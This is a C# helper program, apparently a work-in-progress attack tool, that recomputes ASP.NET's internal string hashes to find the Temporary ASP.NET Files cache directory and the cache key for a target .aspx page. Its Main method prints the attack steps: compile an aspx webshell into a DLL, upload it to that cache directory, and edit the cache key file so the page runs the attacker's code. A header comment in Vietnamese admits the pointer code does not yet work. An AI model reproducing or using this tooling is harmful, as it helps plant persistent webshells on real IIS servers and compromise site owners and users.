// Cần fix lại phần con trỏ - chưa chạy đc, sẽ update sau :)

using System.Globalization;
using System.Runtime.CompilerServices;

namespace org.example
{
    public class Test
    {   
        // System.String.GetLegacyNonRandomizedHashCode(): String_GetLegacyNonRandomizedHashCode(str)
        internal unsafe int String_GetLegacyNonRandomizedHashCode(string str)
        {
            char* ptr = str;
            if (ptr != null)
            {
                ptr += RuntimeHelpers.OffsetToStringData / 2;
            }
            int num = 5381;
            int num2 = num;
            char* ptr2 = ptr;
            int num3;
            while ((num3 = (int)(*ptr2)) != 0)
            {
                num = ((num << 5) + num ^ num3);
                num3 = (int)ptr2[1];
                if (num3 == 0)
                {
                    break;
                }
                num2 = ((num2 << 5) + num2 ^ num3);
                ptr2 += 2;
            }
            return num + num2 * 1566083941;
        }
        
        // System.Web.Util.StringUtil.GetStringHashCode(string s): StringUtil_GetStringHashCode(s.ToLower(CultureInfo.InvariantCulture))
        internal unsafe static int StringUtil_GetStringHashCode(string s)
        {
            char* ptr = s;
            if (ptr != null)
            {
                ptr += RuntimeHelpers.OffsetToStringData / 2;
            }
            int num = 352654597;
            int num2 = num;
            int* ptr2 = (int*)ptr;
            for (int i = s.Length; i > 0; i -= 4)
            {
                num = ((num << 5) + num + (num >> 27) ^ *ptr2);
                if (i <= 2)
                {
                    break;
                }
                num2 = ((num2 << 5) + num2 + (num2 >> 27) ^ ptr2[1]);
                ptr2 += 2;
            }
            return num + num2 * 1566083941;
        }

        private static string AppName(string appId)
        {
            int index = appId.LastIndexOf("/");
            return appId.Substring(index + 1).ToLower();
        }

        private static string BaseName(string physicalPath, string appId)
        {
            int baseNameInt = StringUtil_GetStringHashCode(appId.ToLower(CultureInfo.InvariantCulture) + 
                                                           physicalPath.ToLower(CultureInfo.InvariantCulture));
            return baseNameInt.ToString("x", CultureInfo.InvariantCulture); // convert to hex
        }
        
        private static string CodeGenDir(string physicalPath, string appId)
        {
            string tempDir = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\";
            string basePath = tempDir + AppName(appId);
            string baseName = BaseName(physicalPath, appId);
            return basePath + @"\" + String_GetLegacyNonRandomizedHashCode(baseName) + @"\" + baseName;
        }

        private static string GetCacheKey(string virtualPath)
        {
            string text = virtualPath;
            int num = text.LastIndexOf("/");
            if (text == "~")
            {
                return "root";
            }

            string str = text.Substring(num + 1);
            string s;
            if (num <= 0)
            {
                s = "/";
            }
            else
            {
                s = text.Substring(0, num);
            }

            return str + "." + StringUtil_GetStringHashCode(s).ToString("x", CultureInfo.InvariantCulture);

        }
        
        public static void Main()
        {
            // where is cache file located
            string physicalPath = @"D:\lab\dotnet\PUBLISH\"; // need end at \
            string appId = ""; // no need end at /
            string codeGenDir = CodeGenDir(physicalPath, appId);
            
            // what is cache key of this virtual path aspx file want to hijack
            string virtualPath = @"";
            string cacheKey = GetCacheKey(virtualPath);
            
            Console.WriteLine("Cache directory: " + codeGenDir);
            Console.WriteLine("CacheKey __" + cacheKey + "__ of virtual path __" + virtualPath + "__");
            
            Console.WriteLine("1. Compile aspx webshell to dll");
            Console.WriteLine("2. Upload dll file to cache directory");
            Console.WriteLine("3. With cache key we just calculated, open cache key file then edit assembly and type property to hijack function");
        }
    }
}
